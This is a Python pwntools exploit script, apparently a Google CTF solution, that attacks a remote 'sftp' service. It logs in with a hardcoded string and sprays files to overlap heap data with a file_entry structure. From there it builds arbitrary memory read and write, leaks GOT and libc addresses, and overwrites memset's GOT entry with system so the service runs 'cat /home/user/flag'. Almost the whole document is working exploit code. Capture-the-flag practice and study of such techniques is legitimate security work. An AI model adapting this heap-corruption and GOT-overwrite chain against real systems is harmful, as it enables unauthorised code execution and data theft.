#!/usr/bin/env python
from pwn import *
import time, struct

def auth():
	print p.recvuntil("? ")
	p.send("yes")
	print p.recvuntil(": ")
	p.send("%H$I%H%I%I%I$I\n")
	print p.recvuntil("sftp.google.ctf.\n")
	print p.recvuntil("sftp> ")

def exit():
	p.sendline("exit")

def bye():
	p.sendline("bye")

def put(path, value):
	buf = "put %s" % path
	buf = buf.ljust(8201) #original length. That's how I can avoid sending "\n" w/o time
	p.send(buf) #ez mar jo
	p.send(str(len(value)).ljust(15))
	p.send(value)
	b = p.recvuntil("sftp> ")

def get(path):
	cmd = "get %s" % path
	p.sendline(cmd)
	print "Size received:"
	print p.recvuntil("\n")	#until the size
	print "Rest received:"
	print p.recvuntil("sftp> ")

def get_leak(path):
	cmd = "get %s" % path
	p.sendline(cmd)
	b = p.recvuntil("sftp> ")
	return b

def pwd():
	p.sendline("pwd")
	print p.recvuntil("sftp> ")

def cd(path):
	p.sendline("cd %s" % path)
	print p.recvuntil("sftp> ")

def ls(path = ""):
	if path == "":
		p.sendline("ls")
	else:
		p.sendline("ls %s" % path)
	print p.recvuntil("sftp> ") #ez nyilvan fos hogy ha utkozik a filenevvel..

def ls_get(path = ""):
	if path == "":
		p.sendline("ls")
	else:
		p.sendline("ls %s" % path)
	b = p.recvuntil("sftp> ") #ez nyilvan fos hogy ha utkozik a filenevvel..
	return b


def ls_leak(pattern):
	p.sendline("ls")
	b = p.recvuntil("sftp> ") #ez nyilvan fos hogy ha utkozik a filenevvel..
	if pattern in b:
		print "Data file_entry overlap achieved!!!!!!"
		return 1
	else:
		#print "ls return normal."
		return 0
	
def mkdir(path):
	p.sendline("mkdir %s" % path)
	print p.recvuntil("sftp> ")

def rm(path):
	p.sendline("rm %s" % path)
	print p.recvuntil("sftp> ")

def rmdir(path):
	p.sendline("rmdir %s" % path)
	print p.recvuntil("sftp> ")

def symlink(oldpath, newpath):
	p.sendline("symlink %s %s" % (oldpath, newpath))
	print p.recvuntil("sftp> ")

REMOTE = True

context.update(arch='amd64')
cwd = './'
bin = os.path.join(cwd, 'sftp_orig')

execute = [
    # 'continue'
]
execute = flat(map(lambda x: x + '\n', execute))

if REMOTE:
	p = remote('sftp.ctfcompetition.com', 1337)
else:
	p = process(bin, cwd=cwd, aslr=True)

auth()

p.interactive()

#loop making files, always check if the ls shows an overlap occured
#since the malloc goes to a rand() address, when making new files, eventually
#we can get lucky and the page of data marker can overlap a file_entry structure.
#if this happens, pwd->child[X].name will simply becomes the marker, so we detect this with ls().
#ls() doesnt use anything else from the file_entry structure, therefore the murdering of pointers
#in it in this case make no difference.

entry_offset = -1

pattern = "B"
fpath = ""
for i in range(0, 5000):
	fpath = "/home/c01db33f/foobar_%d" % i
	put(fpath, pattern*4096)
	if (ls_leak(pattern) == 1):
		#we have an overlap
		print "%s entry's data overlaps with another entry!" % fpath

		#we know that in foobar_%i we have the overlap. let's find the offset.
		out = ls_get()
		start = out.find(pattern*5)
		out = out[start:]
		end = out.find("\n")
		out = out[:end]
		offset_from_data = 4096 - len(out)

		#ok - so the child.name is at this offset. the entry start then is at - 12
		entry_offset = offset_from_data - 12
		break
		
	if ((i % 50) == 0):
		print "[%d] ... " % i

print "We can start writing into %s and at data offset %d is the entry we overlapped." % (fpath, entry_offset)

entry_parent = "Q"*8
entry_type = p32(2)
name = "FFFF" + "\x00"*16
size = p64(16)
ptr = p64(0x40000000)
put(fpath, "X"*entry_offset + entry_parent + entry_type + name + size + ptr)
print "Now we should have the name FFFF, let's write to it and then read it out"


def arb_write(addr, value):

	global fpath, entry_offset

	if (entry_offset == -1):
		print "WM not initialized yet!"
		return

	entry_parent = "Q"*8
	entry_type = p32(2)
	name = "FFFF" + "\x00"*16
	size = p64(len(value))
	ptr = p64(addr)
	put(fpath, "X"*entry_offset + entry_parent + entry_type + name + size + ptr)
	put("FFFF", value)



def arb_read(addr, length):
	if (entry_offset == -1):
		print "WM not initialized yet!"
		return

	entry_parent = "Q"*8
	entry_type = p32(2)
	name = "FFFF" + "\x00"*16
	size = p64(length)
	ptr = p64(addr)
	put(fpath, "X"*entry_offset + entry_parent + entry_type + name + size + ptr)
	return get_leak("FFFF")


#all right, we have arbitrary R/W, yolo. Now we need to find the BSS.
#Idea: start scanning memory for "foobar", if we hit it, that means we've found a valid entry ->
#from there we can go back to the parent->parent to get BSS.

print "Scanning for a valid entry object..."

parent_dir_addr = -1
for i in range(0, 1000):
	addr = 0x40000000 + i*0x1000
	b = arb_read(addr, 0x1000)
	if "foobar" in b:
		print "We found the address of a valid entry!!"
		#print b
		start = b.find("foobar")
		parent_dir_start = start - 12
		parent_dir_addr = unpack(b[parent_dir_start:parent_dir_start+8], 64, endian="little")
		print "0x%08x is the parent dir address." % parent_dir_addr
		break
	elif ((i % 50) == 0):
		print "[%d]..." % i

if parent_dir_addr == -1:
	print "Did not find the entry in 1000 tries! Fuck you."
	

#now we just have to walk back twice to read/write the GOT!

def leak_got_addr(got, idx):
	leak = arb_read(got+idx*8, 8)
	leak = unpack(leak[2:10], 64)
	return leak

leak = arb_read(parent_dir_addr, 8)
g_home_folder_addr = unpack(leak[2:10], 64, endian='little')
print "g_home_folder is at 0x%08x" % g_home_folder_addr

memset_location_addr = g_home_folder_addr - (0x8BE0 - 0x5060)
print "memset addr in GOT is 0x%08x" % memset_location_addr

GOT = memset_location_addr - 8*12
print "GOT addr is 0x%08x" % GOT

memset_addr = leak_got_addr(GOT, 12)
abort_addr = leak_got_addr(GOT, 3)
strcpy_addr = leak_got_addr(GOT, 4)
puts_addr = leak_got_addr(GOT, 5)

print "abort: 0x%08x" % abort_addr
print "strcpy: 0x%08x" % strcpy_addr
print "puts: 0x%08x" % puts_addr
print "..."
print "memset: 0x%08x" % memset_addr

libc_base = strcpy_addr - (0xc779d0 - 0xbd2000)
print "libc_base: 0x%08x" % libc_base

#lets setup foobar_1's data now...
#put("foobar_1", "cat flag\x00")
put("foobar_1", "cat /home/user/flag\x00")

if REMOTE == False:
	system_addr = memset_addr - (0x50d6970 - 0x4fa9390)

system_addr = libc_base + (0x7f3e98175390 - 0x7f3e98130000)

#now we do the arbitrary write to get system from memset...
arb_write(memset_location_addr, p64(system_addr))

#and finally trigger memset on the data ptr that currently has "cat /home/user/flag"
#doing it from interactice instead, peace
#put("foobar_1", "c")

p.interactive()
